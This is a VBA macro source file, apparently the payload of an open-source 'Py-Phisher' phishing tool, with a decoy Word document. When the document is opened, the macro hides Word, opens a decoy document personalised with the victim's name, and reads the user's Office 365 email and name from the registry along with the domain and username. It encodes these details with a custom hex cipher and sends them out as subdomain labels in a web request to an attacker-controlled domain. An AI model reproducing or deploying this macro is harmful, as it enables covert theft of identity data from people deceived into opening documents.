' Py-Phisher - A simple script for basic phishing by https://github.com/1mm0rt41PC
'
' Filename: payload.vba
'
' This program is free software; you can redistribute it and/or modify
' it under the terms of the GNU General Public License as published by
' the Free Software Foundation; either version 2 of the License, or
' (at your option) any later version.
'
' This program is distributed in the hope that it will be useful,
' but WITHOUT ANY WARRANTY; without even the implied warranty of
' MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
' GNU General Public License for more details.
'
' You should have received a copy of the GNU General Public License
' along with this program; see the file COPYING. If not, write to the
' Free Software Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

Const MAIN_DOMAIN As String = "xxx.fr"


Public Sub Document_Open()
    Dim sDocName As String
    Dim oInlineDoc As Document: Set oInlineDoc = Nothing
    Dim oWordApp As Application
    Dim isDebugMode As Boolean: isDebugMode = (UBound(Split(ThisDocument.Name, "$DEBUG$")) = 1)

    Application.DisplayAlerts = False
    Application.Visible = isDebugMode
    
    Dim i As Integer
    For i = 1 To ThisDocument.InlineShapes.Count
        If ThisDocument.InlineShapes(i).Type = wdInlineShapeEmbeddedOLEObject Then
            Set oInlineDoc = ThisDocument.InlineShapes(i).OLEFormat.Object
        End If
    Next i
    
    ' If there is an internal word object in that word, we show this embded word and we hidde this current word
    If Not (oInlineDoc Is Nothing) Then
        sDocName = Environ("TMP") & "\" & Split(ThisDocument.Name, ".")(0) & "-" & Format(Now, "yyyymmddhhMMss") & ".docx"
        With oInlineDoc.Range.Find
            .Text = "{NAME}"
            .Replacement.Text = getFromO365("FriendlyName", "___________________")
            .Replacement.ClearFormatting
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = False
            .MatchWildcards = False
            .MatchSoundsLike = False
            .MatchAllWordForms = False
            .Execute Replace:=wdReplaceAll
        End With
        updateAllFields oInlineDoc
        oInlineDoc.SaveAs sDocName, wdFormatDocumentDefault
        ' Ouverture du document Word dans une nouvelle fenetre
        Set oWordApp = CreateObject("Word.Application")
        oWordApp.Visible = True
        oWordApp.Documents.Open (sDocName)
    End If
    
    ' Send the message
    Call sendRequest
    
    If isDebugMode Or ThisDocument.InlineShapes.Count = 0 Then
        Application.DisplayAlerts = True
        Exit Sub
    End If
    ThisDocument.Close False
    Application.Quit
End Sub


' Sub that send a dns message with data
' Data are: DocumentName $ Domain\Username $ Office365Email $ TimeEpoch
Private Sub sendRequest()
    On Error GoTo sendRequest_err
    Dim WinHttpReq As Object: Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    ' Generate a payload
    Dim data As String: data = hexProtect(str2hexStr(Replace(ThisDocument.Name, "$DEBUG$", "") & "$" & Environ("userdomain") & "\" & Environ("username") & "$" & getFromO365("EmailAddress", "unk@unk.unk") & "$" & DateDiff("s", #1/1/1970#, Now())))
    Dim payload As String: payload = ""
    Dim fullpayload As String: fullpayload = ""
    ' Split the payload to avoid subdomain lenght exception
    Dim i
    For i = 0 To Len(data) - 1 Step 63
        payload = payload & "." & Mid(data, i + 1, 63)
    Next
    fullpayload = payload
    If Mid(payload, 1, 250 - 15) <> payload Then
        payload = Mid(payload, 1, 250 - 15 - 1) & "_"
    End If
    'xmlhttp.Open Method, URL, async(true or false)
    WinHttpReq.Open "GET", "http://vba" & payload & "." & MAIN_DOMAIN & "/" & fullpayload, True
    WinHttpReq.send
sendRequest_err:
    On Error GoTo 0
End Sub


' Function that get the email of the current user and get the fullname of the current user.
' This function works only for people who have office365
Private Function getFromO365(pType As String, sDefaultReturn As String) As String
    ' pType=EmailAddress
    ' pType=FriendlyName
    On Error GoTo getFromO365_err
    Const HKEY_CURRENT_USER = &H80000001
    Dim strKeyPath: strKeyPath = "Software\Microsoft\Office\16.0\Common\Identity\Identities"
    Dim oReg: Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

    oReg.EnumKey HKEY_CURRENT_USER, strKeyPath, arrSubKeys

    For Each strSubkey In arrSubKeys
        oReg.GetStringValue HKEY_CURRENT_USER, strKeyPath & "\" & strSubkey, pType, strValue
        If Not IsEmpty(strValue) Then
            getFromO365 = strValue
            Exit Function
        End If
    Next
getFromO365_err:
    On Error GoTo 0
    getFromO365 = sDefaultReturn
End Function


' Sub that update all word fields
Private Sub updateAllFields(oDoc As Object)
    Dim oStory As Object
    Dim oToc As Object
    
    For Each oStory In oDoc.StoryRanges
        oStory.Fields.Update
    Next oStory
    For Each oToc In oDoc.TablesOfContents
        oToc.Update
    Next oToc
End Sub


' Function to convert <string> "AB" into a <Hex string> "4142"
Private Function str2hexStr(sData As String) As String
    If Len(sData) = 0 Then
        str2hexStr = ""
        Exit Function
    End If
    ReDim arr(Len(sData) - 1) As Variant
    Dim i As Integer
    For i = 0 To Len(sData) - 1
        arr(i) = Right("00" & Hex(Asc(Mid(sData, i + 1, 1))), 2)
    Next
    str2hexStr = Replace(Join(arr), " ", "")
End Function


' Function to convert <Hex string> ("4142") into a real <string> "AB"
Function strHex2str(sData As String) As String
    ReDim aRet(Len(sData) / 2 - 1)
    Dim i
    For i = 0 To UBound(aRet)
        aRet(i) = ChrW("&H" & Mid(sData, i * 2 + 1, 2))
    Next
    strHex2str = Join(aRet, "")
End Function


' Function to test hexProtect and hexUnProtect
Private Sub testDecoder()
    Debug.Print str2hexStr("AB")
    Dim sData As String: sData = "vba.xxx.xxx.xxx.myDomain.xxx"
    sData = Replace(sData, "vba.", "")
    sData = Replace(sData, "." & MAIN_DOMAIN, "")
    sData = Replace(sData, ".", "")
    sData = hexUnProtect(sData)
    sData = strHex2str(sData)
    Debug.Print sData
End Sub


' Function to convert <hex> into a <custom format>
Function hexProtect(sData As String) As String
    Dim aInp As Variant: aInp = Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f")
    Dim aOut As Variant: aOut = Array("_", "r", "t", "y", "u", "i", "o", "p", "q", "s", "g", "h", "j", "k", "l", "m")
    Dim i As Integer
    For i = 0 To UBound(aInp)
        sData = Replace(sData, aInp(i), aOut(i))
    Next i
    hexProtect = sData
End Function


' Function to convert <custom format> into <hex>
Function hexUnProtect(sData As String) As String
    Dim aInp As Variant: aInp = Array("_", "r", "t", "y", "u", "i", "o", "p", "q", "s", "g", "h", "j", "k", "l", "m")
    Dim aOut As Variant: aOut = Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f")
    Dim i As Integer
    For i = 0 To UBound(aInp)
        sData = Replace(sData, aInp(i), aOut(i))
    Next i
    hexUnProtect = sData
End Function

